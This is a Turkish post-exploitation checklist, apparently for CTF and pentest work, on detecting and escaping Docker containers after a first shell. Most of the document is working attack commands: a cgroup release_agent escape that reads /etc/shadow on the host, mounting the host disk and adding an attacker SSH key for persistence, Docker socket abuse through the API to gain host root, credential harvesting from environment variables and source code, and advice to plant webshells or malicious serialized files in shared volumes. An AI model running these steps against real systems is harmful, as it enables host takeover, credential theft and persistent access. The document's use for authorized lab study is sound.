
 İlk Shell Sonrası: Konteyner & Docker Checklist (Genel / Makineden Bağımsız)

> Bu, belirli bir makineye özel değildir. Bir web zafiyetiyle **ilk shell'i aldığın** her
> durumda uygulanabilen genel bir metodolojidir. Mantığı anla, ezberleme.
>
> **Altın kural:** Önce **Nerede** → sonra **Ne yapabiliyorum** → en son **Sömür.**
> Rastgele exploit deneme; keşif (enumeration) kazandıran şeydir.

---

## Aşama 1 — "Neredeyim?" (Ortam tespiti)

Shell aldığında 3 yerden birinde olabilirsin: **normal makine**, **Docker konteyneri**,
ya da **Kubernetes pod'u**. Aşağıdakileri sırayla çalıştır.

```bash
# Kimlik ve isim
id
whoami
hostname                       # Rastgele/kısa hex isim (örn. 3f9a2b1c4d5e) → konteyner işareti

# Docker konteyneri miyim? (EN ÖNEMLİ)
ls -la /.dockerenv             # Bu dosya varsa → kesin Docker konteyneri
cat /proc/1/cgroup             # İçinde "docker" geçiyorsa → Docker; "kubepods" → K8s
cat /proc/mounts | grep -Ei 'overlay|docker'   # overlay + /var/lib/docker/overlay2 → Docker

# Kubernetes pod'u muyum? (bunları GÖRMÜYORSAN saf Docker'dasın)
ls -la /var/run/secrets/kubernetes.io/serviceaccount/   # klasör varsa → pod
env | grep -i kube             # KUBERNETES_SERVICE_HOST vb. → Kubernetes
```

**Docker imzaları (bunlardan biri bile yeter):**
- `/.dockerenv` dosyası mevcut
- `/proc/1/cgroup` içinde `docker` geçiyor
- `/proc/mounts`'ta `/` **overlay** tipinde ve yol `/var/lib/docker/overlay2/...` içeriyor
- `hostname` kısa rastgele hex (konteyner ID'sinin ilk 12 hanesi)

**Karar:**
- [ ] Kubernetes işareti **var** → Kubernetes checklist'ine geç.
- [ ] Sadece Docker işareti var → **Aşama 2**'den devam (bu döküman).
- [ ] Hiçbir konteyner işareti yok → muhtemelen bare-metal/VM → **Aşama 6** (klasik privesc).

---

## Aşama 2 — Konteyneri tanı: "Bu kutu ne kadar açık?"

Docker'da hedef neredeyse her zaman **host'a kaçmak (container escape)** ya da
**host ile paylaşılan bir kaynağı istismar etmek**tir. Önce kutunun ne kadar
"delikli" olduğunu ölçeriz.

```bash
# Ne kadar yetkiliyim? Ayrıcalıklı (privileged) konteyner miyim?
cat /proc/self/status | grep -i cap        # CapEff / CapBnd satırları
capsh --print 2>/dev/null                  # okunabilir capability listesi
id                                          # root muyum (uid=0)?

# Host'un kaynakları içeri sızmış mı?
ls -la /var/run/docker.sock                 # docker soketi → çoğu zaman anında host root
mount                                        # tüm mount'lar
cat /proc/mounts | grep -vE 'proc|sys|cgroup|tmpfs|devpts|mqueue|shm'  # gerçek/dış mount'lar
findmnt                                      # okunabilir mount ağacı (varsa)

# Ağ ve process paylaşımı
ls -la /proc/1/                             # PID 1 host'un init'i mi? (--pid=host işareti)
ip addr; hostname -I 2>/dev/null            # host ile aynı ağ mı (--net=host)?

# Cihazlara erişim (privileged konteynerde /dev doludur)
ls -la /dev                                 # sda, sda1, dm-0 gibi disk cihazları görünüyorsa kritik
```

**Yorumlama:**
- `uid=0` **ve** `CapEff` çok geniş (`0000003fffffffff`) → **privileged konteyner** → Aşama 3.1 / 3.2
- `/var/run/docker.sock` var → **Aşama 3.3** (en kolay yol)
- `/dev/sda*` gibi host diski görünüyor → **Aşama 3.2**
- Hiçbiri yoksa → **Aşama 4** (paylaşımlı mount / lateral) ve **Aşama 6** (klasik privesc)

---

## Aşama 3 — Klasik Container Escape yolları (sırayla dene)

### 3.1 — `privileged: true` konteyner: cgroup release_agent ile host'ta komut

Konteyner privileged ise cgroup mekanizmasını kötüye kullanıp **host'ta** komut çalıştırabilirsin.

```bash
# Yazılabilir bir cgroup mount'u hazırla
mkdir /tmp/cg
mount -t cgroup -o rdma cgroup /tmp/cg 2>/dev/null || \
mount -t cgroup -o memory cgroup /tmp/cg
mkdir -p /tmp/cg/x
echo 1 > /tmp/cg/x/notify_on_release

# release_agent'ı host tarafında çalışacak script'e ayarla
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
echo "$host_path/cmd" > /tmp/cg/release_agent

# Host'ta çalışacak komut
cat > /cmd <<'EOF'
#!/bin/sh
id > /output 2>&1
cat /etc/shadow >> /output 2>&1
EOF
chmod +x /cmd

# Tetikle: son process ölünce release_agent host'ta çalışır
sh -c "echo \$\$ > /tmp/cg/x/cgroup.procs"
cat /output
```

> Modern kernel'lerde bu klasik teknik yamalı olabilir. Alternatif olarak **3.2** (host diskini
> doğrudan mount et) privileged konteynerde daha güvenilirdir.

### 3.2 — Host diski görünüyorsa: doğrudan mount et

`/dev/sda1` gibi host diski konteyner içinden görünüyorsa (privileged'da tipik):

```bash
fdisk -l 2>/dev/null                # bölümleri gör
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host           # host kök diski
ls -la /mnt/host                    # host'un tüm dosya sistemi
# Root'a giden yollar:
cat /mnt/host/etc/shadow            # hash'leri kır
cat /mnt/host/root/root.txt         # bayrağı oku
# Kalıcılık: SSH anahtarı ekle
mkdir -p /mnt/host/root/.ssh && echo "ssh-ed25519 AAAA... saldirgan" >> /mnt/host/root/.ssh/authorized_keys
```

### 3.3 — Docker soketi mount edilmişse: en kolay host root

`/var/run/docker.sock` konteyner içinde varsa → Docker daemon'a komut verebilirsin,
daemon **host'ta root** çalışır. Host'un `/`'ını içine mount eden yeni bir konteyner başlat:

```bash
ls -la /var/run/docker.sock

# docker istemcisi varsa (kolay):
docker -H unix:///var/run/docker.sock run -it -v /:/host --privileged alpine chroot /host sh

# docker istemcisi yoksa, curl ile Docker API üzerinden:
# 1) host / mount eden konteyner oluştur
curl -s -XPOST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cp /etc/shadow /host/tmp/shadow.txt || tail -f /dev/null"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  http://localhost/containers/create

# 2) dönen Id ile başlat:
curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<ID>/start
# Host'un /'ı artık o konteynerde /host altında → host root
```

> `docker.sock` erişimi = pratikte **host root**. Konteyner escape'in en yaygın ve en hızlı yolu.

### 3.4 — Tehlikeli capability'ler: `CAP_SYS_ADMIN` / `CAP_SYS_PTRACE` / `CAP_DAC_READ_SEARCH`

Privileged olmasan bile tek bir güçlü capability escape'e yeter:

```bash
capsh --print | grep -i cap        # hangi capability'ler var?
```

| Capability | Ne sağlar |
|---|---|
| `CAP_SYS_ADMIN` | mount, cgroup release_agent (3.1), pek çok escape tekniği |
| `CAP_DAC_READ_SEARCH` | `shocker` tekniğiyle host dosyalarını okuma (open_by_handle_at) |
| `CAP_SYS_PTRACE` (+ `--pid=host`) | Host process'lerine bağlanıp kod enjekte etme |
| `CAP_SYS_MODULE` | Host kernel'ine kötü modül yükleme → tam kontrol |
| `CAP_NET_RAW` | Ağ dinleme/spoof (escape değil ama lateral hareket) |

---

## Aşama 4 — Escape yoksa: paylaşımlı mount & lateral hareket

Kutu sıkı ise (unprivileged, docker.sock yok, disk yok) doğrudan escape olmayabilir.
Bu durumda **konteynerler arası / konteynerden host'a köprüleri** ararsın.

```bash
# Dışarıdan mount edilmiş (paylaşımlı) volume'ler — köprü burasıdır
cat /proc/mounts | grep -vE 'proc|sys|cgroup|tmpfs|devpts|mqueue|shm|overlay'
# Aynı fiziksel diskten (örn. /dev/sda4) gelen birden çok mount → paylaşımlı volume işareti

# Bu volume'lere yazabiliyor muyum? Başka bir servis bunları okuyor/çalıştırıyor mu?
find / -writable -not -path '/proc/*' 2>/dev/null | grep -vE '^/(tmp|dev|sys|run|proc)'

# Paylaşımlı dizine "yem" bırak → daha yetkili bir process onu işlerse RCE
# (örn: bir izleyici script yüklenen dosyaları root/başka kullanıcıyla işliyorsa)
```

> **Kritik fikir:** Konteyner izolasyonu, paylaşımlı bir volume ile delinir. Sen yazabildiğin
> bir dizine dosya koyarsın; **daha yetkili başka bir konteyner/host process'i** o dosyayı
> güvensiz şekilde işlerse (deserialization, komut enjeksiyonu, path traversal, webshell)
> onun yetkisine sıçrarsın. Paylaşımlı `/datastore`, `/uploads`, `/shared` gibi dizinler bu köprüdür.

**Yem senaryoları (paylaşımlı dizine ne bırakılır):**

| Karşı taraf ne yapıyor? | Sen ne bırakırsın |
|---|---|
| Yüklenen dosyayı web'den serve ediyor | Webshell (`.php`, `.jsp` vs.) → web kullanıcısıyla RCE |
| Bir script dosyaları okuyup **eval/pickle/torch.load** ediyor | Kötü niyetli serialize dosyası → deserialization RCE |
| Dosya adını shell'e sokuyor (`os.system`, backtick) | Komut enjeksiyonlu dosya adı |
| Çıktıyı başka yere kopyalıyor/çalıştırıyor | Path traversal ile hedef yolu ez / SUID bırak |

---

## Aşama 5 — İç servis & credential avı (her durumda yap)

Konteynerler genelde tek iş yapar ama **kimlik bilgisi ve iç servis** doludur.

```bash
# Ortam değişkenleri — konteynerlerde şifre/token sık sık BURADADIR
env
cat /proc/1/environ | tr '\0' '\n'          # PID 1'in environ'ı (init script'in gizlileri)

# Uygulama kaynak kodu ve config'ler
ls -la /app /srv /opt /var/www 2>/dev/null
grep -rniE 'password|passwd|secret|api_key|token|connectionstring|db_' \
  /app /opt /srv /var/www 2>/dev/null | head -40

# Sadece localhost'a bağlı iç servisler (DB, cache, admin panel)
# ss/netstat yoksa /proc veya python ile:
cat /proc/net/tcp /proc/net/tcp6 2>/dev/null    # hex; 0100007F=127.0.0.1
python3 -c "
import socket
for p in [3306,5432,6379,27017,8080,8000,5000,9200,3000,11211,1433,9000]:
    s=socket.socket(); s.settimeout(0.3)
    if s.connect_ex(('127.0.0.1',p))==0: print('OPEN',p)
    s.close()"

# ps yoksa /proc üzerinden process listesi
for p in /proc/[0-9]*; do printf '%s: ' "$(basename $p)"; tr '\0' ' ' <$p/cmdline 2>/dev/null; echo; done

# Farklı uid ile çalışan process var mı? (ona sıçramak hedef)
for p in /proc/[0-9]*; do u=$(awk '/^Uid:/{print $2}' $p/status 2>/dev/null); \
  [ -n "$u" ] && echo "PID $(basename $p) uid=$u: $(tr '\0' ' ' <$p/cmdline 2>/dev/null)"; done
```

---

## Aşama 6 — Konteyner içi klasik privilege escalation

Escape/lateral olmasa da, konteyner içinde **root olmak** (uid 0) yine değerlidir —
sonraki escape tekniklerinin çoğu root gerektirir.

```bash
sudo -l                                    # sudo ile ne çalıştırabiliyorum? (NOPASSWD altın)
find / -perm -4000 -type f 2>/dev/null     # SUID binary'ler → gtfobins.github.io
find / -perm -2000 -type f 2>/dev/null     # SGID binary'ler
find / -group $(id -gn) -writable 2>/dev/null   # grubumun yazabildiği dosyalar

# Zamanlanmış görevler (konteynerde nadir ama olur)
ls -la /etc/cron* /var/spool/cron* 2>/dev/null

# Kernel — host ile PAYLAŞILIR! Konteynerdeki kernel exploit host'u da vurur.
uname -a                                    # sürüme göre kernel exploit ara

# Otomatik araçlar
# linpeas.sh  → genel Linux privesc
# deepce.sh   → Docker/konteynere ÖZEL escape kontrolleri (bunu tercih et)
```

> **Not:** Konteyner kernel'i host ile ortaktır. Konteyner içinde çalışan bir **kernel exploit
> doğrudan host'u ele geçirebilir** — bu da bir escape yoludur.

---

## Akış şeması

```
İlk shell alındı
      │
      ▼
[1] id / hostname / ls -la /.dockerenv / /proc/1/cgroup   ← "Neredeyim?"
      │
      ├── Kubernetes işareti VAR ──► Kubernetes checklist
      │
      └── Docker konteyneri
                │
                ▼
        [2] privileged? docker.sock? host diski? capabilities?   ← "Kutu ne kadar açık?"
                │
                ▼
        [3] Escape kapıları (sırayla):
              docker.sock var   → API ile host'u mount et → host root   (en kolay)
              privileged/disk   → /dev/sdaX mount et → host root
              privileged        → cgroup release_agent → host'ta komut
              tehlikeli cap     → CAP_SYS_ADMIN / DAC_READ_SEARCH / SYS_MODULE
                │  (escape yoksa)
                ▼
        [4] Paylaşımlı volume → yem bırak → daha yetkili process'e sıçra (lateral)
                │
                ▼
        [5] env / kaynak kod / iç servis / credential avı
                │
                ▼
        [6] Konteyner içi klasik privesc (sudo -l, SUID, kernel exploit)
```

---

## Hazır araçlar

| Araç | Ne işe yarar |
|---|---|
| `deepce.sh` | Docker/konteynere **özel** escape ve enumeration — ilk çalıştıracağın |
| `linpeas.sh` | Genel Linux privesc + bazı konteyner kontrolleri |
| `amicontained` | Hangi konteyner runtime'ı, hangi capability/seccomp kısıtları var |
| `cdk` (Container DucK) | Otomatik escape exploit'leri + credential avı (Go, tek binary) |
| GTFOBins | SUID/sudo binary'lerini istismar referansı |

---

## 7 kritik hatırlatma

1. **Sıra önemli:** Nerede → Ne kadar açık → Sömür. Rastgele exploit atma.
2. **`docker.sock` = host root.** Bir konteynerde bu soketi görürsen, neredeyse her zaman
   oyun bitmiştir; önce buna bak.
3. **`privileged: true` + host diski/cihazı = altın kombinasyon.** `/dev/sdaX` görünüyorsa
   doğrudan mount et, kernel tekniğiyle uğraşma.
4. **Paylaşımlı volume'ü küçümseme.** Escape olmasa bile, paylaşılan bir dizine yazıp daha
   yetkili bir process'i istismar ederek (deserialization, webshell, komut enjeksiyonu) sıçrarsın.
5. **Kernel host ile ortaktır.** Konteyner içindeki kernel exploit host'u da ele geçirir.
6. **Enumeration sıkıcı ama kazandıran şeydir.** `env`, kaynak kod ve `/proc` içindeki
   process'ler çoğu zaman yolu doğrudan gösterir.
7. **Sadece yetkili ortamlarda kullan** (CTF / lab / izinli pentest).

---

*Genel Docker/konteyner post-exploitation metodolojisi. Değerler (mount yolları, cihaz adları,
konteyner ID) her ortamda değişir — komutları kendi hedefine göre uyarla.*
